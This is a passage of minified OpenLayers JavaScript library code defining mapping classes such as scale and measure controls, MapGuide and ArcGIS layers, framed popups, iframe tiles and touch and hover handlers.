OpenLayers.Geometry.Point(l.lon,l.lat)}k=this.createFilter(k,a);null!==k&&f.push(k)}}g=this.createSelectionLayer(d);this.events.triggerEvent(\"selected\",{layer:d,filters:f});\nd=this.createSLD(d,f,e);g.mergeNewParams({SLD_BODY:d});delete this._queue}};this.applySelection()},applySelection:function(){for(var a=!0,b=0,c=this.layers.length;b<c;b++)if(!this.wfsCache[this.layers[b].id]){a=!1;break}a&&this._queue.call(this)},CLASS_NAME:\"OpenLayers.Control.SLDSelect\"});OpenLayers.Control.Scale=OpenLayers.Class(OpenLayers.Control,{element:null,geodesic:!1,initialize:function(a,b){OpenLayers.Control.prototype.initialize.apply(this,[b]);this.element=OpenLayers.Util.getElement(a)},draw:function(){OpenLayers.Control.prototype.draw.apply(this,arguments);this.element||(this.element=document.createElement(\"div\"),this.div.appendChild(this.element));this.map.events.register(\"moveend\",this,this.updateScale);this.updateScale();return this.div},updateScale:function(){var a;\nif(!0===this.geodesic){if(!this.map.getUnits())return;a=OpenLayers.INCHES_PER_UNIT;a=(this.map.getGeodesicPixelSize().w||1E-6)*a.km*OpenLayers.DOTS_PER_INCH}else a=this.map.getScale();a&&(a=9500<=a&&95E4>=a?Math.round(a/1E3)+\"K\":95E4<=a?Math.round(a/1E6)+\"M\":Math.round(a),this.element.innerHTML=OpenLayers.i18n(\"Scale = 1 : ${scaleDenom}\",{scaleDenom:a}))},CLASS_NAME:\"OpenLayers.Control.Scale\"});OpenLayers.Layer.MapGuide=OpenLayers.Class(OpenLayers.Layer.Grid,{isBaseLayer:!0,useHttpTile:!1,singleTile:!1,useOverlay:!1,useAsyncOverlay:!0,TILE_PARAMS:{operation:\"GETTILEIMAGE\",version:\"1.2.0\"},SINGLE_TILE_PARAMS:{operation:\"GETMAPIMAGE\",format:\"PNG\",locale:\"en\",clip:\"1\",version:\"1.0.0\"},OVERLAY_PARAMS:{operation:\"GETDYNAMICMAPOVERLAYIMAGE\",format:\"PNG\",locale:\"en\",clip:\"1\",version:\"2.0.0\"},FOLDER_PARAMS:{tileColumnsPerFolder:30,tileRowsPerFolder:30,format:\"png\",querystring:null},defaultSize:new OpenLayers.Size(300,\n300),tileOriginCorner:\"tl\",initialize:function(a,b,c,d){OpenLayers.Layer.Grid.prototype.initialize.apply(this,arguments);if(null==d||null==d.isBaseLayer)this.isBaseLayer=\"true\"!=this.transparent&&!0!=this.transparent;d&&null!=d.useOverlay&&(this.useOverlay=d.useOverlay);this.singleTile?this.useOverlay?(OpenLayers.Util.applyDefaults(this.params,this.OVERLAY_PARAMS),this.useAsyncOverlay||(this.params.version=\"1.0.0\")):OpenLayers.Util.applyDefaults(this.params,this.SINGLE_TILE_PARAMS):(this.useHttpTile?\nOpenLayers.Util.applyDefaults(this.params,this.FOLDER_PARAMS):OpenLayers.Util.applyDefaults(this.params,this.TILE_PARAMS),this.setTileSize(this.defaultSize))},clone:function(a){null==a&&(a=new OpenLayers.Layer.MapGuide(this.name,this.url,this.params,this.getOptions()));return a=OpenLayers.Layer.Grid.prototype.clone.apply(this,[a])},getURL:function(a){var b;b=a.getCenterLonLat();var c=this.map.getSize();this.singleTile?(a={setdisplaydpi:OpenLayers.DOTS_PER_INCH,setdisplayheight:c.h*this.ratio,setdisplaywidth:c.w*\nthis.ratio,setviewcenterx:b.lon,setviewcentery:b.lat,setviewscale:this.map.getScale()},this.useOverlay&&!this.useAsyncOverlay&&(b={},b=OpenLayers.Util.extend(b,a),b.operation=\"GETVISIBLEMAPEXTENT\",b.version=\"1.0.0\",b.session=this.params.session,b.mapName=this.params.mapName,b.format=\"text/xml\",b=this.getFullRequestString(b),OpenLayers.Request.GET({url:b,async:!1})),b=this.getFullRequestString(a)):(c=this.map.getResolution(),b=Math.floor((a.left-this.maxExtent.left)/c),b=Math.round(b/this.tileSize.w),\na=Math.floor((this.maxExtent.top-a.top)/c),a=Math.round(a/this.tileSize.h),b=this.useHttpTile?this.getImageFilePath({tilecol:b,tilerow:a,scaleindex:this.resolutions.length-this.map.zoom-1}):this.getFullRequestString({tilecol:b,tilerow:a,scaleindex:this.resolutions.length-this.map.zoom-1}));return b},getFullRequestString:function(a,b){var c=null==b?this.url:b;\"object\"==typeof c&&(c=c[Math.floor(Math.random()*c.length)]);var d=c,e=OpenLayers.Util.extend({},this.params),e=OpenLayers.Util.extend(e,a),\nf=OpenLayers.Util.upperCaseObject(OpenLayers.Util.getParameters(c)),g;for(g in e)g.toUpperCase()in f&&delete e[g];e=OpenLayers.Util.getParameterString(e);e=e.replace(/,/g,\"+\");\"\"!=e&&(f=c.charAt(c.length-1),d=\"&\"==f||\"?\"==f?d+e:-1==c.indexOf(\"?\")?d+(\"?\"+e):d+(\"&\"+e));return d},getImageFilePath:function(a,b){var c=null==b?this.url:b;\"object\"==typeof c&&(c=c[Math.floor(Math.random()*c.length)]);var d=\"\",e=\"\";0>a.tilerow&&(d=\"-\");d=0==a.tilerow?d+\"0\":d+Math.floor(Math.abs(a.tilerow/this.params.tileRowsPerFolder))*\nthis.params.tileRowsPerFolder;0>a.tilecol&&(e=\"-\");e=0==a.tilecol?e+\"0\":e+Math.floor(Math.abs(a.tilecol/this.params.tileColumnsPerFolder))*this.params.tileColumnsPerFolder;d=\"/S\"+Math.floor(a.scaleindex)+\"/\"+this.params.basemaplayergroupname+\"/R\"+d+\"/C\"+e+\"/\"+a.tilerow%this.params.tileRowsPerFolder+\"_\"+a.tilecol%this.params.tileColumnsPerFolder+\".\"+this.params.format;this.params.querystring&&(d+=\"?\"+this.params.querystring);return c+d},CLASS_NAME:\"OpenLayers.Layer.MapGuide\"});OpenLayers.Control.Measure=OpenLayers.Class(OpenLayers.Control,{callbacks:null,displaySystem:\"metric\",geodesic:!1,displaySystemUnits:{geographic:[\"dd\"],english:[\"mi\",\"ft\",\"in\"],metric:[\"km\",\"m\"]},partialDelay:300,delayedTrigger:null,persist:!1,immediate:!1,initialize:function(a,b){OpenLayers.Control.prototype.initialize.apply(this,[b]);var c={done:this.measureComplete,point:this.measurePartial};this.immediate&&(c.modify=this.measureImmediate);this.callbacks=OpenLayers.Util.extend(c,this.callbacks);\nthis.handlerOptions=OpenLayers.Util.extend({persist:this.persist},this.handlerOptions);this.handler=new a(this,this.callbacks,this.handlerOptions)},deactivate:function(){this.cancelDelay();return OpenLayers.Control.prototype.deactivate.apply(this,arguments)},cancel:function(){this.cancelDelay();this.handler.cancel()},setImmediate:function(a){(this.immediate=a)?this.callbacks.modify=this.measureImmediate:delete this.callbacks.modify},updateHandler:function(a,b){var c=this.active;c&&this.deactivate();\nthis.handler=new a(this,this.callbacks,b);c&&this.activate()},measureComplete:function(a){this.cancelDelay();this.measure(a,\"measure\")},measurePartial:function(a,b){this.cancelDelay();b=b.clone();this.handler.freehandMode(this.handler.evt)?this.measure(b,\"measurepartial\"):this.delayedTrigger=window.setTimeout(OpenLayers.Function.bind(function(){this.delayedTrigger=null;this.measure(b,\"measurepartial\")},this),this.partialDelay)},measureImmediate:function(a,b,c){c&&!this.handler.freehandMode(this.handler.evt)&&\n(this.cancelDelay(),this.measure(b.geometry,\"measurepartial\"))},cancelDelay:function(){null!==this.delayedTrigger&&(window.clearTimeout(this.delayedTrigger),this.delayedTrigger=null)},measure:function(a,b){var c,d;-1<a.CLASS_NAME.indexOf(\"LineString\")?(c=this.getBestLength(a),d=1):(c=this.getBestArea(a),d=2);this.events.triggerEvent(b,{measure:c[0],units:c[1],order:d,geometry:a})},getBestArea:function(a){for(var b=this.displaySystemUnits[this.displaySystem],c,d,e=0,f=b.length;e<f&&!(c=b[e],d=this.getArea(a,\nc),1<d);++e);return[d,c]},getArea:function(a,b){var c,d;this.geodesic?(c=a.getGeodesicArea(this.map.getProjectionObject()),d=\"m\"):(c=a.getArea(),d=this.map.getUnits());var e=OpenLayers.INCHES_PER_UNIT[b];e&&(c*=Math.pow(OpenLayers.INCHES_PER_UNIT[d]/e,2));return c},getBestLength:function(a){for(var b=this.displaySystemUnits[this.displaySystem],c,d,e=0,f=b.length;e<f&&!(c=b[e],d=this.getLength(a,c),1<d);++e);return[d,c]},getLength:function(a,b){var c,d;this.geodesic?(c=a.getGeodesicLength(this.map.getProjectionObject()),\nd=\"m\"):(c=a.getLength(),d=this.map.getUnits());var e=OpenLayers.INCHES_PER_UNIT[b];e&&(c*=OpenLayers.INCHES_PER_UNIT[d]/e);return c},CLASS_NAME:\"OpenLayers.Control.Measure\"});OpenLayers.Format.WMC.v1_0_0=OpenLayers.Class(OpenLayers.Format.WMC.v1,{VERSION:\"1.0.0\",schemaLocation:\"http://www.opengis.net/context http://schemas.opengis.net/context/1.0.0/context.xsd\",initialize:function(a){OpenLayers.Format.WMC.v1.prototype.initialize.apply(this,[a])},read_wmc_SRS:function(a,b){var c=this.getChildValue(b);\"object\"!=typeof a.projections&&(a.projections={});for(var c=c.split(/ +/),d=0,e=c.length;d<e;d++)a.projections[c[d]]=!0},write_wmc_Layer:function(a){var b=OpenLayers.Format.WMC.v1.prototype.write_wmc_Layer.apply(this,\n[a]);if(a.srs){var c=[],d;for(d in a.srs)c.push(d);b.appendChild(this.createElementDefaultNS(\"SRS\",c.join(\" \")))}b.appendChild(this.write_wmc_FormatList(a));b.appendChild(this.write_wmc_StyleList(a));a.dimensions&&b.appendChild(this.write_wmc_DimensionList(a));b.appendChild(this.write_wmc_LayerExtension(a))},CLASS_NAME:\"OpenLayers.Format.WMC.v1_0_0\"});OpenLayers.Popup.Anchored=OpenLayers.Class(OpenLayers.Popup,{relativePosition:null,keepInMap:!0,anchor:null,initialize:function(a,b,c,d,e,f,g){OpenLayers.Popup.prototype.initialize.apply(this,[a,b,c,d,f,g]);this.anchor=null!=e?e:{size:new OpenLayers.Size(0,0),offset:new OpenLayers.Pixel(0,0)}},destroy:function(){this.relativePosition=this.anchor=null;OpenLayers.Popup.prototype.destroy.apply(this,arguments)},show:function(){this.updatePosition();OpenLayers.Popup.prototype.show.apply(this,arguments)},\nmoveTo:function(a){var b=this.relativePosition;this.relativePosition=this.calculateRelativePosition(a);OpenLayers.Popup.prototype.moveTo.call(this,this.calculateNewPx(a));this.relativePosition!=b&&this.updateRelativePosition()},setSize:function(a){OpenLayers.Popup.prototype.setSize.apply(this,arguments);if(this.lonlat&&this.map){var b=this.map.getLayerPxFromLonLat(this.lonlat);this.moveTo(b)}},calculateRelativePosition:function(a){a=this.map.getLonLatFromLayerPx(a);a=this.map.getExtent().determineQuadrant(a);\nreturn OpenLayers.Bounds.oppositeQuadrant(a)},updateRelativePosition:function(){},calculateNewPx:function(a){a=a.offset(this.anchor.offset);var b=this.size||this.contentSize,c=\"t\"==this.relativePosition.charAt(0);a.y+=c?-b.h:this.anchor.size.h;c=\"l\"==this.relativePosition.charAt(1);a.x+=c?-b.w:this.anchor.size.w;return a},CLASS_NAME:\"OpenLayers.Popup.Anchored\"});OpenLayers.Popup.Framed=OpenLayers.Class(OpenLayers.Popup.Anchored,{imageSrc:null,imageSize:null,isAlphaImage:!1,positionBlocks:null,blocks:null,fixedRelativePosition:!1,initialize:function(a,b,c,d,e,f,g){OpenLayers.Popup.Anchored.prototype.initialize.apply(this,arguments);this.fixedRelativePosition&&(this.updateRelativePosition(),this.calculateRelativePosition=function(a){return this.relativePosition});this.contentDiv.style.position=\"absolute\";this.contentDiv.style.zIndex=1;f&&(this.closeDiv.style.zIndex=\n1);this.groupDiv.style.position=\"absolute\";this.groupDiv.style.top=\"0px\";this.groupDiv.style.left=\"0px\";this.groupDiv.style.height=\"100%\";this.groupDiv.style.width=\"100%\"},destroy:function(){this.isAlphaImage=this.imageSize=this.imageSrc=null;this.fixedRelativePosition=!1;this.positionBlocks=null;for(var a=0;a<this.blocks.length;a++){var b=this.blocks[a];b.image&&b.div.removeChild(b.image);b.image=null;b.div&&this.groupDiv.removeChild(b.div);b.div=null}this.blocks=null;OpenLayers.Popup.Anchored.prototype.destroy.apply(this,\narguments)},setBackgroundColor:function(a){},setBorder:function(){},setOpacity:function(a){},setSize:function(a){OpenLayers.Popup.Anchored.prototype.setSize.apply(this,arguments);this.updateBlocks()},updateRelativePosition:function(){this.padding=this.positionBlocks[this.relativePosition].padding;if(this.closeDiv){var a=this.getContentDivPadding();this.closeDiv.style.right=a.right+this.padding.right+\"px\";this.closeDiv.style.top=a.top+this.padding.top+\"px\"}this.updateBlocks()},calculateNewPx:function(a){var b=\nOpenLayers.Popup.Anchored.prototype.calculateNewPx.apply(this,arguments);return b=b.offset(this.positionBlocks[this.relativePosition].offset)},createBlocks:function(){this.blocks=[];var a=null,b;for(b in this.positionBlocks){a=b;break}a=this.positionBlocks[a];for(b=0;b<a.blocks.length;b++){var c={};this.blocks.push(c);c.div=OpenLayers.Util.createDiv(this.id+\"_FrameDecorationDiv_\"+b,null,null,null,\"absolute\",null,\"hidden\",null);c.image=(this.isAlphaImage?OpenLayers.Util.createAlphaImageDiv:OpenLayers.Util.createImage)(this.id+\n\"_FrameDecorationImg_\"+b,null,this.imageSize,this.imageSrc,\"absolute\",null,null,null);c.div.appendChild(c.image);this.groupDiv.appendChild(c.div)}},updateBlocks:function(){this.blocks||this.createBlocks();if(this.size&&this.relativePosition){for(var a=this.positionBlocks[this.relativePosition],b=0;b<a.blocks.length;b++){var c=a.blocks[b],d=this.blocks[b],e=c.anchor.left,f=c.anchor.bottom,g=c.anchor.right,h=c.anchor.top,k=isNaN(c.size.w)?this.size.w-(g+e):c.size.w,l=isNaN(c.size.h)?this.size.h-(f+\nh):c.size.h;d.div.style.width=(0>k?0:k)+\"px\";d.div.style.height=(0>l?0:l)+\"px\";d.div.style.left=null!=e?e+\"px\":\"\";d.div.style.bottom=null!=f?f+\"px\":\"\";d.div.style.right=null!=g?g+\"px\":\"\";d.div.style.top=null!=h?h+\"px\":\"\";d.image.style.left=c.position.x+\"px\";d.image.style.top=c.position.y+\"px\"}this.contentDiv.style.left=this.padding.left+\"px\";this.contentDiv.style.top=this.padding.top+\"px\"}},CLASS_NAME:\"OpenLayers.Popup.Framed\"});OpenLayers.Popup.FramedCloud=OpenLayers.Class(OpenLayers.Popup.Framed,{contentDisplayClass:\"olFramedCloudPopupContent\",autoSize:!0,panMapIfOutOfView:!0,imageSize:new OpenLayers.Size(1276,736),isAlphaImage:!1,fixedRelativePosition:!1,positionBlocks:{tl:{offset:new OpenLayers.Pixel(44,0),padding:new OpenLayers.Bounds(8,40,8,9),blocks:[{size:new OpenLayers.Size(\"auto\",\"auto\"),anchor:new OpenLayers.Bounds(0,51,22,0),position:new OpenLayers.Pixel(0,0)},{size:new OpenLayers.Size(22,\"auto\"),anchor:new OpenLayers.Bounds(null,\n50,0,0),position:new OpenLayers.Pixel(-1238,0)},{size:new OpenLayers.Size(\"auto\",19),anchor:new OpenLayers.Bounds(0,32,22,null),position:new OpenLayers.Pixel(0,-631)},{size:new OpenLayers.Size(22,18),anchor:new OpenLayers.Bounds(null,32,0,null),position:new OpenLayers.Pixel(-1238,-632)},{size:new OpenLayers.Size(81,35),anchor:new OpenLayers.Bounds(null,0,0,null),position:new OpenLayers.Pixel(0,-688)}]},tr:{offset:new OpenLayers.Pixel(-45,0),padding:new OpenLayers.Bounds(8,40,8,9),blocks:[{size:new OpenLayers.Size(\"auto\",\n\"auto\"),anchor:new OpenLayers.Bounds(0,51,22,0),position:new OpenLayers.Pixel(0,0)},{size:new OpenLayers.Size(22,\"auto\"),anchor:new OpenLayers.Bounds(null,50,0,0),position:new OpenLayers.Pixel(-1238,0)},{size:new OpenLayers.Size(\"auto\",19),anchor:new OpenLayers.Bounds(0,32,22,null),position:new OpenLayers.Pixel(0,-631)},{size:new OpenLayers.Size(22,19),anchor:new OpenLayers.Bounds(null,32,0,null),position:new OpenLayers.Pixel(-1238,-631)},{size:new OpenLayers.Size(81,35),anchor:new OpenLayers.Bounds(0,\n0,null,null),position:new OpenLayers.Pixel(-215,-687)}]},bl:{offset:new OpenLayers.Pixel(45,0),padding:new OpenLayers.Bounds(8,9,8,40),blocks:[{size:new OpenLayers.Size(\"auto\",\"auto\"),anchor:new OpenLayers.Bounds(0,21,22,32),position:new OpenLayers.Pixel(0,0)},{size:new OpenLayers.Size(22,\"auto\"),anchor:new OpenLayers.Bounds(null,21,0,32),position:new OpenLayers.Pixel(-1238,0)},{size:new OpenLayers.Size(\"auto\",21),anchor:new OpenLayers.Bounds(0,0,22,null),position:new OpenLayers.Pixel(0,-629)},{size:new OpenLayers.Size(22,\n21),anchor:new OpenLayers.Bounds(null,0,0,null),position:new OpenLayers.Pixel(-1238,-629)},{size:new OpenLayers.Size(81,33),anchor:new OpenLayers.Bounds(null,null,0,0),position:new OpenLayers.Pixel(-101,-674)}]},br:{offset:new OpenLayers.Pixel(-44,0),padding:new OpenLayers.Bounds(8,9,8,40),blocks:[{size:new OpenLayers.Size(\"auto\",\"auto\"),anchor:new OpenLayers.Bounds(0,21,22,32),position:new OpenLayers.Pixel(0,0)},{size:new OpenLayers.Size(22,\"auto\"),anchor:new OpenLayers.Bounds(null,21,0,32),position:new OpenLayers.Pixel(-1238,\n0)},{size:new OpenLayers.Size(\"auto\",21),anchor:new OpenLayers.Bounds(0,0,22,null),position:new OpenLayers.Pixel(0,-629)},{size:new OpenLayers.Size(22,21),anchor:new OpenLayers.Bounds(null,0,0,null),position:new OpenLayers.Pixel(-1238,-629)},{size:new OpenLayers.Size(81,33),anchor:new OpenLayers.Bounds(0,null,null,0),position:new OpenLayers.Pixel(-311,-674)}]}},minSize:new OpenLayers.Size(105,10),maxSize:new OpenLayers.Size(1200,660),initialize:function(a,b,c,d,e,f,g){this.imageSrc=OpenLayers.Util.getImageLocation(\"cloud-popup-relative.png\");\nOpenLayers.Popup.Framed.prototype.initialize.apply(this,arguments);this.contentDiv.className=this.contentDisplayClass},CLASS_NAME:\"OpenLayers.Popup.FramedCloud\"});OpenLayers.Tile.Image.IFrame={useIFrame:null,blankImageUrl:\"data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAQAIBRAA7\",draw:function(){if(OpenLayers.Tile.Image.prototype.shouldDraw.call(this)){var a=this.layer.getURL(this.bounds),b=this.useIFrame;this.useIFrame=null!==this.maxGetUrlLength&&!this.layer.async&&a.length>this.maxGetUrlLength;a=b&&!this.useIFrame;b=!b&&this.useIFrame;if(a||b)this.imgDiv&&this.imgDiv.parentNode===this.frame&&this.frame.removeChild(this.imgDiv),this.imgDiv=\nnull,a&&this.frame.removeChild(this.frame.firstChild)}return OpenLayers.Tile.Image.prototype.draw.apply(this,arguments)},getImage:function(){if(!0===this.useIFrame){if(!this.frame.childNodes.length){var a=document.createElement(\"div\"),b=a.style;b.position=\"absolute\";b.width=\"100%\";b.height=\"100%\";b.zIndex=1;b.backgroundImage=\"url(\"+this.blankImageUrl+\")\";this.frame.appendChild(a)}a=this.id+\"_iFrame\";9>parseFloat(navigator.appVersion.split(\"MSIE\")[1])?(b=document.createElement('<iframe name=\"'+a+'\">'),\nb.style.backgroundColor=\"#FFFFFF\",b.style.filter=\"chroma(color=#FFFFFF)\"):(b=document.createElement(\"iframe\"),b.style.backgroundColor=\"transparent\",b.name=a);b.scrolling=\"no\";b.marginWidth=\"0px\";b.marginHeight=\"0px\";b.frameBorder=\"0\";b.style.position=\"absolute\";b.style.width=\"100%\";b.style.height=\"100%\";1>this.layer.opacity&&OpenLayers.Util.modifyDOMElement(b,null,null,null,null,null,null,this.layer.opacity);this.frame.appendChild(b);return this.imgDiv=b}return OpenLayers.Tile.Image.prototype.getImage.apply(this,\narguments)},createRequestForm:function(){var a=document.createElement(\"form\");a.method=\"POST\";var b=this.layer.params._OLSALT,b=(b?b+\"_\":\"\")+this.bounds.toBBOX();a.action=OpenLayers.Util.urlAppend(this.layer.url,b);a.target=this.id+\"_iFrame\";this.layer.getImageSize();var b=OpenLayers.Util.getParameters(this.url),c,d;for(d in b)c=document.createElement(\"input\"),c.type=\"hidden\",c.name=d,c.value=b[d],a.appendChild(c);return a},setImgSrc:function(a){if(!0===this.useIFrame)if(a){var b=this.createRequestForm();\nthis.frame.appendChild(b);b.submit();this.frame.removeChild(b)}else this.imgDiv.parentNode===this.frame&&(this.frame.removeChild(this.imgDiv),this.imgDiv=null);else OpenLayers.Tile.Image.prototype.setImgSrc.apply(this,arguments)},onImageLoad:function(){OpenLayers.Tile.Image.prototype.onImageLoad.apply(this,arguments);!0===this.useIFrame&&(this.imgDiv.style.opacity=1,this.frame.style.opacity=this.layer.opacity)},createBackBuffer:function(){var a;!1===this.useIFrame&&(a=OpenLayers.Tile.Image.prototype.createBackBuffer.call(this));\nreturn a}};OpenLayers.Format.SOSCapabilities=OpenLayers.Class(OpenLayers.Format.XML.VersionedOGC,{defaultVersion:\"1.0.0\",CLASS_NAME:\"OpenLayers.Format.SOSCapabilities\"});OpenLayers.Format.SOSCapabilities.v1_0_0=OpenLayers.Class(OpenLayers.Format.SOSCapabilities,{namespaces:{ows:\"http://www.opengis.net/ows/1.1\",sos:\"http://www.opengis.net/sos/1.0\",gml:\"http://www.opengis.net/gml\",xlink:\"http://www.w3.org/1999/xlink\"},regExes:{trimSpace:/^\\s*|\\s*$/g,removeSpace:/\\s*/g,splitSpace:/\\s+/,trimComma:/\\s*,\\s*/g},initialize:function(a){OpenLayers.Format.XML.prototype.initialize.apply(this,[a]);this.options=a},read:function(a){\"string\"==typeof a&&(a=OpenLayers.Format.XML.prototype.read.apply(this,\n[a]));a&&9==a.nodeType&&(a=a.documentElement);var b={};this.readNode(a,b);return b},readers:{gml:OpenLayers.Util.applyDefaults({name:function(a,b){b.name=this.getChildValue(a)},TimePeriod:function(a,b){b.timePeriod={};this.readChildNodes(a,b.timePeriod)},beginPosition:function(a,b){b.beginPosition=this.getChildValue(a)},endPosition:function(a,b){b.endPosition=this.getChildValue(a)}},OpenLayers.Format.GML.v3.prototype.readers.gml),sos:{Capabilities:function(a,b){this.readChildNodes(a,b)},Contents:function(a,\nb){b.contents={};this.readChildNodes(a,b.contents)},ObservationOfferingList:function(a,b){b.offeringList={};this.readChildNodes(a,b.offeringList)},ObservationOffering:function(a,b){var c=this.getAttributeNS(a,this.namespaces.gml,\"id\");b[c]={procedures:[],observedProperties:[],featureOfInterestIds:[],responseFormats:[],resultModels:[],responseModes:[]};this.readChildNodes(a,b[c])},time:function(a,b){b.time={};this.readChildNodes(a,b.time)},procedure:function(a,b){b.procedures.push(this.getAttributeNS(a,\nthis.namespaces.xlink,\"href\"))},observedProperty:function(a,b){b.observedProperties.push(this.getAttributeNS(a,this.namespaces.xlink,\"href\"))},featureOfInterest:function(a,b){b.featureOfInterestIds.push(this.getAttributeNS(a,this.namespaces.xlink,\"href\"))},responseFormat:function(a,b){b.responseFormats.push(this.getChildValue(a))},resultModel:function(a,b){b.resultModels.push(this.getChildValue(a))},responseMode:function(a,b){b.responseModes.push(this.getChildValue(a))}},ows:OpenLayers.Format.OWSCommon.v1_1_0.prototype.readers.ows},\nCLASS_NAME:\"OpenLayers.Format.SOSCapabilities.v1_0_0\"});OpenLayers.Handler.Pinch=OpenLayers.Class(OpenLayers.Handler,{started:!1,stopDown:!1,pinching:!1,last:null,start:null,touchstart:function(a){var b=!0;this.pinching=!1;if(OpenLayers.Event.isMultiTouch(a))this.started=!0,this.last=this.start={distance:this.getDistance(a.touches),delta:0,scale:1},this.callback(\"start\",[a,this.start]),b=!this.stopDown;else{if(this.started)return!1;this.started=!1;this.last=this.start=null}OpenLayers.Event.preventDefault(a);return b},touchmove:function(a){if(this.started&&\nOpenLayers.Event.isMultiTouch(a)){this.pinching=!0;var b=this.getPinchData(a);this.callback(\"move\",[a,b]);this.last=b;OpenLayers.Event.stop(a)}else if(this.started)return!1;return!0},touchend:function(a){return this.started&&!OpenLayers.Event.isMultiTouch(a)?(this.pinching=this.started=!1,this.callback(\"done\",[a,this.start,this.last]),this.last=this.start=null,!1):!0},activate:function(){var a=!1;OpenLayers.Handler.prototype.activate.apply(this,arguments)&&(this.pinching=!1,a=!0);return a},deactivate:function(){var a=\n!1;OpenLayers.Handler.prototype.deactivate.apply(this,arguments)&&(this.pinching=this.started=!1,this.last=this.start=null,a=!0);return a},getDistance:function(a){var b=a[0];a=a[1];return Math.sqrt(Math.pow(b.olClientX-a.olClientX,2)+Math.pow(b.olClientY-a.olClientY,2))},getPinchData:function(a){a=this.getDistance(a.touches);return{distance:a,delta:this.last.distance-a,scale:a/this.start.distance}},CLASS_NAME:\"OpenLayers.Handler.Pinch\"});OpenLayers.Control.NavToolbar=OpenLayers.Class(OpenLayers.Control.Panel,{initialize:function(a){OpenLayers.Control.Panel.prototype.initialize.apply(this,[a]);this.addControls([new OpenLayers.Control.Navigation,new OpenLayers.Control.ZoomBox])},draw:function(){var a=OpenLayers.Control.Panel.prototype.draw.apply(this,arguments);null===this.defaultControl&&(this.defaultControl=this.controls[0]);return a},CLASS_NAME:\"OpenLayers.Control.NavToolbar\"});OpenLayers.Strategy.Refresh=OpenLayers.Class(OpenLayers.Strategy,{force:!1,interval:0,timer:null,activate:function(){var a=OpenLayers.Strategy.prototype.activate.call(this);a&&(!0===this.layer.visibility&&this.start(),this.layer.events.on({visibilitychanged:this.reset,scope:this}));return a},deactivate:function(){var a=OpenLayers.Strategy.prototype.deactivate.call(this);a&&(this.stop(),this.layer.events.un({visibilitychanged:this.reset,scope:this}));return a},reset:function(){!0===this.layer.visibility?\nthis.start():this.stop()},start:function(){this.interval&&(\"number\"===typeof this.interval&&0<this.interval)&&(this.timer=window.setInterval(OpenLayers.Function.bind(this.refresh,this),this.interval))},refresh:function(){this.layer&&(this.layer.refresh&&\"function\"==typeof this.layer.refresh)&&this.layer.refresh({force:this.force})},stop:function(){null!==this.timer&&(window.clearInterval(this.timer),this.timer=null)},CLASS_NAME:\"OpenLayers.Strategy.Refresh\"});OpenLayers.Layer.ArcGIS93Rest=OpenLayers.Class(OpenLayers.Layer.Grid,{DEFAULT_PARAMS:{format:\"png\"},isBaseLayer:!0,initialize:function(a,b,c,d){var e=[];c=OpenLayers.Util.upperCaseObject(c);e.push(a,b,c,d);OpenLayers.Layer.Grid.prototype.initialize.apply(this,e);OpenLayers.Util.applyDefaults(this.params,OpenLayers.Util.upperCaseObject(this.DEFAULT_PARAMS));this.params.TRANSPARENT&&\"true\"==this.params.TRANSPARENT.toString().toLowerCase()&&(null!=d&&d.isBaseLayer||(this.isBaseLayer=!1),\"jpg\"==this.params.FORMAT&&\n(this.params.FORMAT=OpenLayers.Util.alphaHack()?\"gif\":\"png\"))},clone:function(a){null==a&&(a=new OpenLayers.Layer.ArcGIS93Rest(this.name,this.url,this.params,this.getOptions()));return a=OpenLayers.Layer.Grid.prototype.clone.apply(this,[a])},getURL:function(a){a=this.adjustBounds(a);var b=this.projection.getCode().split(\":\"),b=b[b.length-1],c=this.getImageSize();a={BBOX:a.toBBOX(),SIZE:c.w+\",\"+c.h,F:\"image\",BBOXSR:b,IMAGESR:b};if(this.layerDefs){var b=[],d;for(d in this.layerDefs)this.layerDefs.hasOwnProperty(d)&&\nthis.layerDefs[d]&&(b.push(d),b.push(\":\"),b.push(this.layerDefs[d]),b.push(\";\"));0<b.length&&(a.LAYERDEFS=b.join(\"\"))}return this.getFullRequestString(a)},setLayerFilter:function(a,b){this.layerDefs||(this.layerDefs={});b?this.layerDefs[a]=b:delete this.layerDefs[a]},clearLayerFilter:function(a){a?delete this.layerDefs[a]:delete this.layerDefs},mergeNewParams:function(a){a=[OpenLayers.Util.upperCaseObject(a)];return OpenLayers.Layer.Grid.prototype.mergeNewParams.apply(this,a)},CLASS_NAME:\"OpenLayers.Layer.ArcGIS93Rest\"});OpenLayers.Handler.Hover=OpenLayers.Class(OpenLayers.Handler,{delay:500,pixelTolerance:null,stopMove:!1,px:null,timerId:null,mousemove:function(a){this.passesTolerance(a.xy)&&(this.clearTimer(),this.callback(\"move\",[a]),this.px=a.xy,a=OpenLayers.Util.extend({},a),this.timerId=window.setTimeout(OpenLayers.Function.bind(this.delayedCall,this,a),this.delay));return!this.stopMove},mouseout:function(a){OpenLayers.Util.mouseLeft(a,this.map.viewPortDiv)&&(this.clearTimer(),this.callback(\"move\",[a]));return!0},\npassesTolerance:function(a){var b=!0;this.pixelTolerance&&this.px&&Math.sqrt(Math.pow(this.px.x-a.x,2)+Math.pow(this.px.y-a.y,2))<this.pixelTolerance&&(b=!1);return b},clearTimer:function(){null!=this.timerId&&(window.clearTimeout(this.timerId),this.timerId=null)},delayedCall:function(a){this.callback(\"pause\",[a])},deactivate:function(){var a=!1;OpenLayers.Handler.prototype.deactivate.apply(this,arguments)&&(this.clearTimer(),a=!0);return a},CLASS_NAME:\"OpenLayers.Handler.Hover\"});OpenLayers.Control.GetFeature=OpenLayers.Class(OpenLayers.Control,{protocol:null,multipleKey:null,toggleKey:null,modifiers:null,multiple:!1,click:!0,single:!0,clickout:!0,toggle:!1,clickTolerance:5,hover:!1,box:!1,maxFeatures:10,features:null,hoverFeature:null,handlers:null,hoverResponse:null,filterType:OpenLayers.Filter.Spatial.BBOX,initialize:function(a){a.handlerOptions=a.handlerOptions||{};OpenLayers.Control.prototype.initialize.apply(this,[a]);this.features={};this.handlers={};this.click&&(this.handlers.click=\nnew OpenLayers.Handler.Click(this,{click:this.selectClick},this.handlerOptions.click||{}));this.box&&(this.handlers.box=new OpenLayers.Handler.Box(this,{done:this.selectBox},OpenLayers.Util.extend(this.handlerOptions.box,{boxDivClassName:\"olHandlerBoxSelectFeature\"})));this.hover&&(this.handlers.hover=new OpenLayers.Handler.Hover(this,{move:this.cancelHover,pause:this.selectHover},OpenLayers.Util.extend(this.handlerOptions.hover,{delay:250,pixelTolerance:2})))},activate:function(){if(!this.active)for(var a in 